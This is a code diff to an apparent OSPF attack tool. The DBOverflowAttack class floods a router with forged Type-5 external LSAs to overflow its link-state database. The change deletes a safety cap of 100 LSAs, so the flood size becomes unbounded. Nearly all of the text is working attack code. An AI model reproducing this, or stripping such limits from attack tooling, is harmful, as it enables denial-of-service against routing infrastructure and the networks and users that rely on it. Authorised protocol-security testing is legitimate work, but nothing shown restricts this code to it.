@@ -20,8 +20,7 @@ class DBOverflowAttack(BaseAttack):
         from ospf_attack.network.adapter import get_local_ip
         src_ip = get_local_ip(self.config.iface)
         base_net = 0x0A000000
-        count = min(self.config.lsa_count, 100)
-        for i in range(count):
+        for i in range(self.config.lsa_count):
             lsid = str(ipaddress.IPv4Address(base_net + (i << 8)))
             lsa = build_lsa_header(
                 lsa_type=5, link_state_id=lsid,
@@ -34,7 +33,7 @@ class DBOverflowAttack(BaseAttack):
             pkt = pkt / lsa
             self._sender.send_raw(pkt)
         return AttackResult(success=True, packets_sent=self._sender.sent_count,
-                           target_affected=False, details=f"DB 溢出: {count} Type-5 LSAs")
+                           target_affected=False, details=f"DB 溢出: {self.config.lsa_count} Type-5 LSAs")
 
     def verify(self) -> bool:
         return self._sender.sent_count > 0
